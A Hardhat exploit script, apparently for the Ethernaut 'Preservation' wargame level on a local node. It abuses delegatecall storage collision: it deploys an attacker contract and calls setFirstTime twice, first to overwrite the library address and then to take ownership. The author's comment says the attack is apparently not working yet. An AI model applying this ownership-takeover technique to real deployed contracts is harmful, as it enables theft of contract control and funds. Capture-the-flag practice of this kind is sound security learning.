// import { TransactionRequest } from "@ethersproject/providers";
import { BigNumber } from "ethers";
import { ethers } from "hardhat";

//Fit player address chosen from hardhat node addresses and contract address (current lvl instance)
const PLAYER_ADDRESS = "0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc";
const CONTRACT_ADDRESS = "0xfF09adb2803168523817a2c9Dd50400FC80ddD1c";

async function main() {
const signer = await ethers.getSigner(PLAYER_ADDRESS);
const contract = await ethers.getContractAt("Preservation", CONTRACT_ADDRESS, signer);

const attackerContractFactory = await ethers.getContractFactory("PreservationAttack", signer);
const attackerContract = await attackerContractFactory.deploy(contract.address);

//HACK STEPS

// 1. Check owner state variable
console.log("The current owner is the following address: ", await contract.owner())

// 2. Call contract setSecondTime()/setFirstTime() func to place our attacker contract 
/// in the state variable. Check if it succeded. 
console.log("Previous timeZone1Library address: ", await contract.timeZone1Library());
console.log("The attacker contract address to send:", attackerContract.address);

// Alternative without using a function in the attacker contract.
const num = BigNumber.from(attackerContract.address);
console.log("The casted Bignumber associated with that addresss:", num)
await contract.setFirstTime(num);

//Alternative way on-chain
// await attackerContract.placeAddress();

console.log("Now, timeZone1Library is: ", await contract.timeZone1Library())

// 3. Call again to modify the slot 2 via our custom delegated function and check result.

// const ABI = ["function setFirstTime(uint _timeStamp)"];
// const iface = new ethers.utils.Interface(ABI);
// const calldata = iface.encodeFunctionData("setFirstTime", [num]);
// console.log("Function signature is: ", calldata);

// const tx : TransactionRequest = {
//     to: contract.address,
//     data: calldata
// }
// await signer.sendTransaction(tx)

const num2 = BigNumber.from(0);
await contract.setFirstTime(num2);
console.log("After second call, the owner become: ", await contract.owner());

//APPARENTLY, IT IS NOT WORKING BUT THE REASON HAS TO BE SOMEWHERE AFTER CHANGING THE ADDRESS..
//USAGE OF CONSOLE HARDHAT???

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
